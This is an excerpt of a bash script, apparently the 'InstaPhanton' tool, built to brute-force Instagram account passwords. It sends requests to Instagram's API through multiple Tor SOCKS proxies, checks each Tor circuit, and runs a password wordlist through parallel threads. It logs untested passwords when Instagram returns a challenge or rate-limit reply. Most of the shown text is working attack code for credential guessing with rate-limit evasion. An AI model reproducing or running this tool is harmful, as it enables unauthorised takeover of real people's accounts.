...
var0=$(
	curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup &
	guid=$uuid >/dev/null
)
...
banner() {
	...
	printf "\e[1;95m  ___           _        ____  _                 _                  \e[0m\n"
	printf "\e[1;95m |_ _|_ __  ___| |_ __ _|  _ \| |__   __ _ _ __ | |_ ___  _ __     \e[0m\n"
	printf "\e[1;95m  | || '_ \/ __| __/ _\` | |_) | '_ \ / _\` | '_ \| __/ _ \| '_ \    \e[0m\n"
	printf "\e[1;95m  | || | | \__ \ || (_| |  __/| | | | (_| | | | | || (_) | | | |   \e[0m\n"
	printf "\e[1;77m |___|_| |_|___/\__\__,_|_|   |_| |_|\__,_|_| |_|\__\___/|_| |_|   \e[0m\n"

	printf "\n"
	printf "\e[1;77m\e[41m  InstaPhanton v1.0, Author: @Kritlesh (Github)  \e[0m\n" # Do not Change NOOB!!
	printf "\n"
}
...
dependencies() {
	...
	command -v openssl >/dev/null 2>&1 || {
		echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."
		exit 1
	}
...
multitor() {
	...
	check1=$(
		curl --socks5-hostname localhost:9051 -s https://www.google.com >/dev/null
		echo $?
	)
	if [[ "check1" -gt 0 ]]; then
	...
	check2=$(
		curl --socks5-hostname localhost:9052 -s https://www.google.com >/dev/null
		echo $?
	)
	if [[ "check2" -gt 0 ]]; then
		printf "\e[1;91mFAIL!\e[0m\n"
	...
	check3=$(
		curl --socks5-hostname localhost:9053 -s https://www.google.com >/dev/null
		echo $?
	)
	if [[ "check3" -gt 0 ]]; then
		printf "\e[1;91mFAIL!\e[0m\n"
	...
	check4=$(
		curl --socks5-hostname localhost:9054 -s https://www.google.com >/dev/null
		echo $?
	)
	if [[ "check4" -gt 0 ]]; then
		printf "\e[1;91mFAIL!\e[0m\n"
	...
	check5=$(
		curl --socks5-hostname localhost:9055 -s https://www.google.com >/dev/null
		echo $?
	)
	if [[ "check5" -gt 0 ]]; then
		printf "\e[1;91mFAIL!\e[0m\n"
...
function store() {
	...
	if [[ -n "$threads" ]]; then
		...
		wait $pid3 >/dev/null 2>&1
		wait $pid4 >/dev/null 2>&1
		wait $!
		sleep 6
		...
		for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
			...
			{ (
				...
				if [[ $var == "challenge" ]]; then
					...
					rm -rf nottested.lst
					kill -1 $$ >/dev/null 2>&1
				elif [[ $var == "Please wait" ]]; then echo $pass >>nottested.lst; elif [[ $var == "" ]]; then echo $pass >>nottested.lst; fi
			); } &
		done
		pid1=$! #;wait $!;
